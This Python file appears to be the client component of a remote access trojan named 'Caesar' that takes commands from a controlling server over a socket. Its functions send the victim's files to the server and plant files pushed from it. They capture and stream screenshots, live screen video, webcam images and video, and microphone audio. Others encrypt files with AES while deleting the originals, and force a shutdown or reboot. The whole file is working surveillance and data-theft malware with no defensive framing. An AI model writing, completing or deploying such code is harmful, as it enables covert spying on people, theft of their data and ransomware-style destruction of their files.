import os
import cv2
import time
import struct
import pickle
import imutils
import pyaudio
import threading
import numpy as np
from Crypto import Random
from PIL import ImageGrab
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Hash import SHA256


class GeneralFeatures:

        def __init__(self):
            self.now = datetime.now()
            self.paudio = pyaudio.PyAudio()
            self.log = ""
            self.stop_event = threading.Event()


        def convert_caesar_text(self, text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m"
            return f"{BOLD}{COLOR}{text}{RESET}"


        # sends file to server
        def send_client_file(self, conn, usrFile):
            try:
                if not os.path.exists(usrFile):
                    conn.send(
                        f"[-]File does not exist! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                elif not os.path.isfile(usrFile):
                    if os.path.isdir(usrFile):
                        conn.send(
                            f"[-]'{usrFile}' is a directory, not a file! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                    else:
                        conn.send(
                            f"[-]'{usrFile}' is not a regular file! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                else:
                    conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                    time.sleep(1)
                    fileSize = os.path.getsize(usrFile)
                    conn.send(str(fileSize).encode())
                    time.sleep(1)
                    with open(usrFile, 'rb') as file:
                        data = file.read(1024)
                        if fileSize == 0:
                            pass
                        elif fileSize < 1024:
                            conn.send(data)
                            file.close()
                        else:
                            while data:
                                conn.send(data)
                                data = file.read(1024)
            except Exception as e:
                conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())


        # receives file from server
        def receive_server_file(self, conn, usrFile):
            try:
                fileSize = int(conn.recv(1024).decode())

                if fileSize == 0:  # if file is empty do nothing
                    # send current working directory back to server
                    conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                else:
                    with open(usrFile, 'wb') as file:
                        if fileSize < 1024:
                            data = conn.recv(1024)
                            file.write(data)
                            file.close()
                        else:
                            data = conn.recv(1024)
                            totalFileRecv = len(data)

                            while totalFileRecv < fileSize:
                                totalFileRecv += len(data)
                                file.write(data)
                                data = conn.recv(1024)
                            file.write(data)
                    conn.send(
                        f"[+]File successfully sent to client! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
            except:
                conn.send(
                    f"[-]Error occurred sending file! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())


        # send screenshot back to server
        def screenshot(self, conn):
            try:
                conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())  # send current working directory back to server
                img = ImageGrab.grab()  # capture image
                img_np = np.array(img)
                frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
                temp_imgName = "img.jpg"  # image name
                cv2.imwrite(temp_imgName, frame)  # write image to a file
                cv2.destroyAllWindows()

                fileSize = os.path.getsize(temp_imgName)
                conn.send(str(self.now.strftime("%d:%m:%Y_%H:%M:%S")).encode() + "_screenshot".encode())
                time.sleep(1)
                conn.send(str(fileSize).encode())
                with open(temp_imgName, 'rb') as file:
                    content = file.read(1024)
                    while content:
                        conn.send(content)
                        content = file.read(1024)
                file.close()
                os.remove("img.jpg")
            except:
                pass


        # send live feed of screen recording back to server
        def live_screen_feed(self, conn):
            conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
            img_counter = 0
            try:
                while True:
                    screen = np.array(ImageGrab.grab(bbox=(0, 0, 1800, 700)))
                    screen = cv2.cvtColor(np.array(screen), cv2.COLOR_RGB2BGR)
                    data = pickle.dumps(screen, 0)
                    size = len(data)

                    if img_counter % 10 == 0:
                        conn.sendall(struct.pack(">L", size) + data)
                        response = conn.recv(1024).decode()
                        if response == "exit":
                            break

                    img_counter += 1
            except:
                pass


        # send live feed of webcam back to server
        def capture_webcam_video(self, conn):
            conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
            cam = cv2.VideoCapture(0)

            img_counter = 0
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]

            try:
                while True:
                    ret, frame = cam.read()
                    frame = imutils.resize(frame, width=320)
                    frame = cv2.flip(frame, 280)
                    result, image = cv2.imencode('.jpg', frame, encode_param)
                    data = pickle.dumps(image, 0)
                    size = len(data)

                    if img_counter % 10 == 0:
                        conn.send(struct.pack(">L", size) + data)

                        data = conn.recv(1024).decode()
                        if data == "exit":
                            cam.release()
                            break

                    img_counter += 1
            except:
                cam.release()



        # send camshot from webcam back to server
        def webcam_capture(self, conn):
            conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())

            try:
                capture = cv2.VideoCapture(0)
                ret, frame = capture.read()  # capture frame by frame
                clientImage = "img.jpg"  # image name
                cv2.imwrite(clientImage, frame)  # write image to a file
                capture.release()  # release capture
                cv2.destroyAllWindows()

                fileSize = os.path.getsize(clientImage)
                conn.send(
                     str(self.now.strftime("%d:%m:%Y_%H:%M:%S")).encode() + "_camshot".encode())
                time.sleep(1)
                conn.send(str(fileSize).encode())
                # send file content
                with open(clientImage, 'rb') as file:
                    content = file.read(1024)
                    while content:
                        conn.send(content)
                        content = file.read(1024)
                file.close()
                os.remove(clientImage)  # remove image from client machine
            except:
                pass


        # encrypt specified file
        def encrypt_file(self, conn, password, filename):
            try:
                hashed_key = SHA256.new(password.encode('utf-8')).digest()  # hash for extra randomisation

                if os.path.exists(filename):
                    encrypted_file = "(Encrypted)" + filename  # append Encrypted to the beginning of the file name
                    filesize = str(os.path.getsize(filename)).rjust(AES.block_size, '0')  # pad each block by 16
                    IV = Random.new().read(AES.block_size)  # initialization vector for randomisation

                    encrypt_file = AES.new(hashed_key, AES.MODE_CBC, IV)

                    with open(filename, 'rb') as usrFile:
                        with open(encrypted_file, 'wb') as outfile:
                            outfile.write(filesize.encode('utf-8'))
                            outfile.write(IV)

                            while True:
                                block = usrFile.read(65536)
                                if len(block) == 0:
                                    break
                                elif len(block) % 16 != 0:
                                    block += b' ' * (16 - (len(block) % 16))  # pad the rest of data to equal 16

                                outfile.write(encrypt_file.encrypt(block))  # encrypt block
                            usrFile.close()
                        os.remove(filename)
                    conn.send(f"[+]File has been encrypted! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                else:
                    conn.send(f"[-]File encryption unsuccessful! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
            except Exception as e:
                conn.send(f"[-]{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())



        # decrypt specified file
        def decrypt_file(self, conn, password, filename):
            try:
                hashed_key = SHA256.new(password.encode('utf-8')).digest()

                if os.path.exists(filename):
                    outputFile = filename.split("\\")
                    outputFile = "".join(outputFile[-1])
                    outputFile = outputFile.replace("(Encrypted)", "")  # remove (Encrypted from file name)

                    with open(filename, 'rb') as encrypted_file:
                        filesize = int(encrypted_file.read(16))
                        IV = encrypted_file.read(AES.block_size)  # initialization vector for randomisation
                        decrypt_file = AES.new(hashed_key, AES.MODE_CBC, IV)

                        with open(outputFile, 'wb') as decrypted_file:
                            while True:
                                block = encrypted_file.read(65536)

                                if len(block) == 0:
                                    break
                                decrypted_file.write(decrypt_file.decrypt(block))  # decrypt block
                            decrypted_file.truncate(filesize)

                    os.remove(filename)
                    conn.send(f"[+]File has been decrypted! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
                else:
                    conn.send(f"[-]File does not exist! \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
            except Exception as e:
                conn.send(f"{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())



        # send microphone audio stream back to the server
        def live_audio_feed(self, conn):
            try:
                conn.send(f"{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())

                chunk = 20000
                FORMAT = pyaudio.paInt16
                channels = 1
                sample_rate = 44100

                # open stream object as input & output
                stream = self.paudio.open(format=FORMAT, channels=channels,
                                     rate=sample_rate, input=True,
                                     output=True, frames_per_buffer=chunk)

                while True:
                    data = stream.read(chunk)
                    new_data = pickle.dumps(data)

                    message = struct.pack("Q", len(new_data)) + new_data
                    conn.sendall(message)
                    resp = conn.recv(1024).decode()

                    if resp == "exit":
                        stream.stop_stream()  # stop and close stream
                        stream.close()
                        self.paudio.terminate()  # terminate pyaudio object
                    #print(resp)
            except:
                pass


        # shut down system
        def shutdown(self, conn):
            try:
                os.system("shutdown /s /t 0")
            except Exception as e:
                conn.send(f"{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())

        # reboot system
        def reboot(self, conn):
            try:
                os.system("shutdown -t 0 -r -f")
            except Exception as e:
                conn.send(f"{e} \n{self.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
